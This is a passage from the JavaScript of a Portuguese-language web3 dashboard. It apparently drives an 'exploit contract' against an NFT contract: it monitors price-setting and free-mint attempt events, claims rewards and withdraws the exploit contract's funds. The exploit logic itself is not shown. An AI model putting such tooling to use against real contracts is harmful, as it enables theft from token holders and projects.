                    exploitContractAddress: exploitContractAddress,
                    timestamp: new Date().toISOString()
                };
                
                // Exibir informações de debug
                addDebugInfo('Estado do Contrato:', JSON.stringify(stateInfo, null, 2));
                
                showAlert('Estado do contrato verificado com sucesso!', 'success');
            } catch (error) {
                console.error('Erro ao verificar estado do contrato:', error);
                showAlert(`Erro ao verificar estado do contrato: ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao verificar estado do contrato: ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        function addDebugInfo(title, content = '') {
            debugInfo.style.display = 'block';
            
            if (content) {
                debugContent.textContent += `\n[${new Date().toLocaleTimeString()}] ${title}:\n${content}\n\n`;
            } else {
                debugContent.textContent += `\n[${new Date().toLocaleTimeString()}] ${title}\n\n`;
            }
            
            // Rolar para o final
            debugContent.scrollTop = debugContent.scrollHeight;
        }
        
        function toggleEventListening() {
            if (listenEventsBtn.textContent.includes('Iniciar')) {
                startEventListening();
                listenEventsBtn.textContent = 'Parar Monitoramento de Eventos';
                listenEventsBtn.classList.remove('btn-success');
                listenEventsBtn.classList.add('btn-danger');
            } else {
                stopEventListening();
                listenEventsBtn.textContent = 'Iniciar Monitoramento de Eventos';
                listenEventsBtn.classList.remove('btn-danger');
                listenEventsBtn.classList.add('btn-success');
            }
        }
        
        function startEventListening() {
            eventsList.style.display = 'block';
            
            // Limpar eventos anteriores
            eventsContent.innerHTML = '';
            
            // Ouvir eventos SetPriceAttempt
            const setPriceListener = exploitContract.on('SetPriceAttempt', (newPrice, success) => {
                addEventInfo('SetPriceAttempt', `newPrice: ${newPrice.toString()}, success: ${success}`);
            });
            
            // Ouvir eventos MintAttempt
            const mintListener = exploitContract.on('MintAttempt', (success) => {
                addEventInfo('MintAttempt', `success: ${success}`);
            });
            
            // Ouvir eventos FreeMint
            const freeMintListener = exploitContract.on('FreeMint', (user, tokenId) => {
                addEventInfo('FreeMint', `user: ${user}, tokenId: ${tokenId.toString()}`);
            });
            
            // Armazenar listeners para poder removê-los depois
            eventListeners = [setPriceListener, mintListener, freeMintListener];
            
            showAlert('Monitoramento de eventos iniciado!', 'success');
        }
        
        function stopEventListening() {
            // Remover todos os listeners
            eventListeners.forEach(listener => {
                listener.removeAllListeners();
            });
            
            eventListeners = [];
            
            showAlert('Monitoramento de eventos parado!', 'info');
        }
        
        function addEventInfo(eventName, details) {
            const eventDiv = document.createElement('div');
            eventDiv.className = 'mb-2 p-2 bg-dark rounded';
            eventDiv.innerHTML = `
                <strong>${eventName}</strong> - ${new Date().toLocaleTimeString()}<br>
                <small>${details}</small>
            `;
            
            eventsContent.insertBefore(eventDiv, eventsContent.firstChild);
            
            // Limitar número de eventos exibidos
            if (eventsContent.children.length > 10) {
                eventsContent.removeChild(eventsContent.lastChild);
            }
        }
        
        async function claimRewards() {
            if (!confirm('Tem certeza que deseja resgatar suas recompensas? Uma taxa de 5% será deduzida.')) {
                return;
            }
            
            showLoading(true);
            
            try {
                const claimTx = await originalContract.claim();
                showTransactionInfo(claimTx.hash);
                
                await claimTx.wait();
                
                showAlert('Recompensas resgatadas com sucesso!', 'success');
                await updateBalances();
                await updateRewards();
            } catch (error) {
                console.error('Erro ao resgatar recompensas:', error);
                showAlert(`Erro ao resgatar recompensas: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function withdrawFunds() {
            if (!confirm('Tem certeza que deseja sacar os fundos do contrato de exploração?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                const withdrawTx = await exploitContract.withdraw();
                showTransactionInfo(withdrawTx.hash);
                
                await withdrawTx.wait();
                
                showAlert('Fundos sacados com sucesso!', 'success');
                await updateBalances();
            } catch (error) {
                console.error('Erro ao sacar fundos:', error);
                showAlert(`Erro ao sacar fundos: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        function showLoading(show) {
            if (show) {
                loadingIndicator.classList.add('show');
            } else {
                loadingIndicator.classList.remove('show');
            }
        }
        
        function showTransactionInfo(hash) {
            txHash.textContent = hash;
            txStatus.textContent = 'Pendente';
            transactionInfo.classList.add('show');
            
            // Verificar status da transação
            provider.once(hash, (receipt) => {
                if (receipt.status === 1) {
                    txStatus.textContent = 'Concluída com sucesso';
                } else {
                    txStatus.textContent = 'Falhou';
                }
            });
        }
        
        function showAlert(message, type) {
            const alertDiv = document.createElement('div');
            alertDiv.className = `alert alert-${type} alert-dismissible fade show alert-custom`;
            alertDiv.innerHTML = `
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            `;
            
            alertContainer.appendChild(alertDiv);
            
            // Auto-fechar após 5 segundos
            setTimeout(() => {
                alertDiv.classList.remove('show');
                setTimeout(() => {
                    alertDiv.remove();
                }, 300);
            }, 5000);
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text)
                .then(() => {
                    showAlert('Copiado para a área de transferência!', 'success');
                })
                .catch(err => {
                    console.error('Erro ao copiar texto: ', err);
                    showAlert('Erro ao copiar texto.', 'danger');
                });
        }
        
        // Monitorar mudanças de conta
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    // Usuário desconectou a carteira
                    disconnectWallet();
                } else {
                    // Usuário mudou de conta
                    userAddress = accounts[0];
                    updateWalletUI();
                    updateBalances();
                    updateNFTs();
                    updateRewards();
                }
            });
            
            window.ethereum.on('chainChanged', () => {
                // Recarregar a página quando a rede mudar
                window.location.reload();
            });
        }
    </script>
</body>
</html>
